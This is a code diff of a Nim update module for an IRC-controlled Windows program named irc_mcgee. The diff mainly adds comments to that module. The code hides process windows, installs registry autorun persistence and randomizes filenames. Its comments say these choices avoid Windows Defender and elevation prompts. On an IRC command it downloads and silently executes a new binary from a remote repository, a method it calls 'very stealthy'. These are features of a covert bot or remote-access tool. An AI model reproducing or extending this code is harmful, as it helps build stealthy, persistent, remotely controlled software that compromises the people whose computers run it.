@@ -1,11 +1,15 @@
 import configparser, os, irc, base64, helper_base64, winim/inc/wininet, winim, random, std/widestrs, asyncdispatch
 
+## Bake current version into the executable, runs at compile time
 const current_version* = readFile("./update/update.ini").parseIni().getProperty("Version","Version")
 
 var
     g_tmp_clean* = false
     g_dbg = true
 
+
+## Silently launches a process
+## The update helper specifially
 proc launchProcess(command: string): bool =
   var
     si: STARTUPINFO
@@ -17,7 +21,6 @@ proc launchProcess(command: string): bool =
   ZeroMemory(addr pi, sizeof(pi))
 
   if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
-  #if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
     CloseHandle(pi.hThread)
     CloseHandle(pi.hProcess)
     result = true
@@ -26,7 +29,8 @@ proc launchProcess(command: string): bool =
 
 
 
-
+# Used as a method to check if a program is running
+# particularly the update helper. If the update helper is running, the main program can terminate so the update can proceed
 proc getProcessIdByName(processName: string): DWORD =
     const bufferSize = 1024
     var processIds: array[bufferSize, DWORD]
@@ -82,7 +86,7 @@ proc getProcessIdByName(processName: string): DWORD =
 
 
 
-
+## Needed to create a link in the startup folder (old)
 # proc createShortcut(targetPath: string, shortcutPath: string) =
 #   var shellLink: ptr IShellLink
 #   var persistFile: ptr IPersistFile
@@ -117,9 +121,11 @@ proc getProcessIdByName(processName: string): DWORD =
 
 
 
-
+# Creates a key in the registry to autorun the program
+# Startup folder just causes nagging by windows defener
+# I don't think anyone uses that anyway
 proc updt_createStartupShortcut*() =
-    #### USING STARTUP FOLDER
+    #### USING STARTUP FOLDER (old)
     var 
          (_, name, _) = splitFile(getAppFilename())
     #     startup_fullpath = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
@@ -156,8 +162,7 @@ proc updt_createStartupShortcut*() =
 
 
 
-
-
+# Downloads website content (works for text and files)
 proc updt_fetchWebsiteContent(url: string): string =
   var
     hInternet, hConnect: HINTERNET
@@ -188,10 +193,12 @@ proc updt_fetchWebsiteContent(url: string): string =
   return content
 
 
+
+## Checks for updates and conducts them
 proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEvent):Future[bool] {.async.} =
     var
         #client = newHttpClient()
-        clientconnected = true
+        #clientconnected = true
         ini_raw:string
 
 
@@ -199,6 +206,7 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
 
 
     try:
+        ## Filenames are slightly randomize because sometimes they get tagged to require elevation otherwise
         randomize()
 
         var
@@ -207,7 +215,7 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
             a_very_random_number:string = $(rand(10000..99999))
             tmpexe = tmpexe_firsthalf & a_very_random_number & ".exe"
 
-
+        ## Cleanup any leftovers from last update
         try:
             if dirExists(tmpdir):
                 removeDir(tmpdir)
@@ -215,38 +223,29 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
             discard
 
 
-        
+        ## Try to see what the current version is
         try:
-            ini_raw = updt_fetchWebsiteContent("https://raw.githubusercontent.com/crackman2/irc_mcgee/master/update/update.ini") #client.getContent("https://raw.githubusercontent.com/crackman2/irc_mcgee/master/update/update.ini")
-            #client.close()
-            clientconnected = false
+            ini_raw = updt_fetchWebsiteContent("https://raw.githubusercontent.com/crackman2/irc_mcgee/master/update/update.ini")
         except OSError as e:
             if (respond_to_caller):
                 discard iclient.privmsg(ievent.origin, "could not get the content of update.ini [" & repr(e) & "]")
             return
-        
-
-
         var
             ini = parseIni(ini_raw)
             ini_version = ini.getProperty("Version","Version")
-            
-
-
+        
+        ## Compare current version with the one online, so we know if we need to update
         if ini_version == current_version:
             if g_dbg: echo " +-> version is up to date [",ini_version,"]"
             if(respond_to_caller):
                 discard iclient.privmsg(ievent.origin, "up to date (mine)[" & current_version & "] vs (online)[" & ini_version & "]")
-            if clientconnected:
-                #client.close()
-                clientconnected = false
             return true
         elif(respond_to_caller):
             discard iclient.privmsg(ievent.origin, "attempting to update, cya")
         if g_dbg: echo " +-> update required. [",current_version,"] -> [", ini_version, "]"
     
 
-
+        ## Create temporary directory to store the latest version of the main executable and also the update helper
         try:
             if not dirExists(tmpdir):
                 createDir(tmpdir)
@@ -254,33 +253,24 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
             if g_dbg: echo " +-> failed to create temp dir"
             if(respond_to_caller):
                 discard iclient.privmsg(ievent.origin, "failed to create temp dir")
-            if clientconnected:
-                #client.close()
-                clientconnected = false
             return
         if g_dbg: echo " +-> getting file"
 
 
-
+        ## Download main executable and save in the temp directory
         try:
-            #client.downloadFile("https://github.com/crackman2/irc_mcgee/raw/master/update/irc_mcgee.exe",tmpexe)
             var data_tmpexe = updt_fetchWebsiteContent("https://github.com/crackman2/irc_mcgee/raw/master/update/irc_mcgee.exe")
             writeFile(tmpexe,data_tmpexe)
-            #client.close()
         except OSError as e:
             if g_dbg: echo " +-> downloading file failed"
             if(respond_to_caller):
                 discard iclient.privmsg(ievent.origin, "failed to download main executable [" & repr(e) & "]")
-            if clientconnected:
-                #client.close()
-                clientconnected = false
             return
         
 
-
+        ## Upon sucess we unpack the update helper
         if fileExists(tmpexe):
             if g_dbg: echo " +-> download successful"
-            #var tmpbat = tmpdir & "irc_mcpatch.bat"
             var
                 tmpbat_firsthalf = tmpdir & "irc_mchelper"
                 tmpbat = tmpbat_firsthalf & a_very_random_number & ".exe"
@@ -302,13 +292,18 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
             ##### OLD OLD OLD OLD OLD OLD OLD OLD OLD #####
 
 
-            sleep(500)
+            await sleepAsync(500)
             var
                 (_, name, ext) = splitFile(tmpbat)
                 tmpbat_filename_only = name & ext
                 first = true
                 current_method = 1
                 max_methods = 2
+
+            ## Attempt to launch the update helper (this must happen, otherwise no patching can be done, the program will get stuck here
+            ## if this fails)
+            ## The first method is likely to work and is also very stealthy
+            ## The second method is also reliable but very noticable (flashes command prompt)
             while getProcessIdByName(tmpbat_filename_only) == 0:
                 if not first:
                     first = false
@@ -330,17 +325,14 @@ proc updt_check*(respond_to_caller:bool = false, iclient:AsyncIrc, ievent:IrcEve
                 else:
                     echo "This is all just terrible"
 
-
                 inc(current_method)
                 if current_method > max_methods: current_method = 1
                 sleep(1000)
-        
+            ## Terminate outselves
             echo "time to go ,2seconds"
             sleep(2000)
             quit(0)
 
-
-        #client.close()
     except OSError as e:
         if g_dbg: echo " +-> update failed"
         if(respond_to_caller):
